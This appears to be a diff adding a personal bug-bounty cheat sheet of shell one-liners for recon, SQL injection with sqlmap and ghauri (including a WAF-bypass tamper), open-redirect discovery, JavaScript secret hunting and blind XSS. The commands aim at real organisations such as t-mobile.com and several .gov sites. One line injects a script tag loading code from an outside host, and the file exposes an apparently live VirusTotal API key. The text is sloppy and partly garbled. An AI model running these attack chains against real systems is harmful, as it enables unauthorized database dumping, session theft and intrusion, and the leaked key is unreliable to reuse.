@@ -1,0 +1,110 @@
+WAYBACK_URL = 'https://web.archive.org/cdx/search/cdx?url=*.dailymotion.com&fl=original&collapse=urlkey'
+URLSCAN_URL = 'https://urlscan.io/api/v1/search/?q=domain:{DOMAIN}&size=10000'
+VIRUSTOTAL_URL = 'https://www.virustotal.com/vtapi/v2/domain/report?apikey=334021f274bd32041d7bb7d60e0afdd779acb707e6217fff766d659952f01873&domain=t-mobile'
+
+Keyword".zi, .zip, .exe, .ex, token=, api=, unsubscribe, secret"
+
+developer name and personal email via installed.json file... commont
+
+dirsearch -u "https://digits.t-mobile.com/" -x 301,403,404,500,400,502,503,302,429 --random-agent --deep-recursive
+
+
+python3 lostsec.py -u "http://testphp.vulnweb.com/artists.php?artist=" -p payloads/xor.txt -t 5
+
+  1. Methe
+
+for multiple urls:
+paramspider -d testphp.vulnweb.com -o urls.txt
+
+cat output/urls.txt | sed 's/FUZZ//g' >final.txt
+
+python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
+
+  2.Methe
+
+echo apps.usgs.gov | gau --mc 200 | urldedupe >urls.txt
+
+cat urls.txt | grep -E ".php|.asp|.aspx|.cfm|.jsp" | grep '=' | sort > output.txt
+
+cat output.txt | sed 's/=.*/=/' >final.txt
+
+python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
+
+  3.Methe
+
+echo testphp.vulnweb.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt
+
+katana -u http://testphp.vulnweb.com -d 5 | grep '=' | urldedupe | anew output.txt
+
+cat output.txt | sed 's/=.*/=/' >final.txt
+
+python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
+
+
+  4. Math
+
+waymore -i "invasivespecies.gov" -mc 200,302 -mode U | qsreplace "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | sort -u | tee parameters.txt
+
+sudo python3 ./lostsec.py -l multichoice.com.parameters.txt -p payloads/xor.txt
+
+ghauri -u "https://www.sciencebase.gov/catalog/catalogParty/show?partyId=*" --batch --confirm --current-db --dbs
+
+
+waf bypass commont with sqlmap
+
+sqlmap -u 
+'https://cutm.ac.in/payu/skill/index.php?id=34' --batch --dbs --threads=5 --random-agent --risk=3 --level=5 --tamper=space2comment -v 3 --dbms  MySQL
+
+
+open redirect:
+		site:prakle.com & inurl:redir | | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http | inurl:redirectUrl=http
+		
+		
+subfinder -d t-mobile.com -all -o subdomain.txt
+
+cat subdomain.txt | httpx -o filter.txt
+
+
+echo https://www.https://wrc.t-mobile.com | gau --threads 102 | tee urls.txt
+
+
+cat urls.txt | gf or | sed 's/=.*/=/' | grep '?redirect_uri' | uro > open.txt
+
+
+1. subfinder -d example.com -all -recursive > subdomain.txt
+
+2. cat subdomain.txt | httpx-toolkit -ports 80, 443, 8080, 8000, 8888 -threads 200 > subdomains_alive.txt
+
+3. katana -u Tsubdomaim.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
+
+
+4. cat allurls.txt | grep -E "\.js$" >> js.txt
+
+cat js.txt | while read url ; do python3 ~/SecretFinder/SecretFinder.py -i $url -o cli ;done
+
+5. cat js.txt | nuclei -t /home/bluez/nuclei-templates/http/exposures/ -c 30
+
+6.cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|_config"
+
+7. dirsearch -u https://example.com -e conf, config, bak, backup, smp, old, db, sql, asp, aspx, py, rb, php, bak, bhp, cache, cgi, conf, csv, html, inc, jar, js, json, jsp, lock, log, rar, old, sql, sql.gz, sql.zip, tar.gz, smp, tar, tar.bz2, tar.gz, txt, wadl, zip, log, xml, js, json
+
+8. subfinder -d example.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/bluediving2024></script>
+
+9. subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_sst
+
+10. python corsy.py -i /home/coffinxp/waitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+
+11. nuclei -list subdomains_alive.txt -tags cves, osint, tech
+
+12. cat allurls.txt | gf lfi | nuclei -tags Lfi
+
+13. cat allurls.txt | gf redirect | openredirex -p /home/bluez/openRedirect/
+
+14 
+subfinder -d testphp.vulnweb.com -all -silent | cow | urldedupe |
+gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 
+--level 5 --random-agent | tee -a sqli.txt
+
+
+cat subs.txt | (gau || hakrawler || katana || waybckurls) | grep "=" | dedupe | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs &&
+for i in $(cat tmp-sqli.txt); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done
